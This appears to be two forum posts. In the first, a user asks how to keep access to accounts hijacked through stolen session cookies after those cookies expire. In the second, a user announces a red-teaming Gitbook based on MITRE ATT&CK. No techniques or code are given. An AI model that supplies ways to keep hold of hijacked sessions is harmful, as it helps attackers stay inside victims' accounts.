<p>Wanted to get everyone’s thoughts on how they maintain access to accounts that have been hijacked using session cookies. The cookies will expire at some point so how would you maintain access when all you have is the session cookie? I’ve investigated changing the expiration date, but it appears that, depending on the site, this can invalidate the cookie on the server side so I’ve been reluctant to try this approach.</p>
<p>Cheers,<br>
Olly</p>

            <h2>Hi, dmcxblue here.</h2>
<p>So just letting know that I started a Gitbook in regards for Red Teaming stuff, it’s just some stuff to help me understand this area a little more better, what a better way then to try and teach people in an area you are totally unfamiliar with… According to my sense, just enough info that I can teach it myself. It’s based frequently on the ATT&amp;CK MITRE Framework with some examples. I know some other people have done this already and there job look’s incredible. But just trying to give it a shot and it also help’s somebody just the way it helped me. As Red Team topics are plentiful and always changing, such as techniques and tactics and such just how amazing these adversaries manage to just move around a network without being detected and the new techniques that researcher’s always find. Well enough typing and more hacking.<br>
Suggestions are welcomed, please let me know if there are more things I can make this book better.</p>
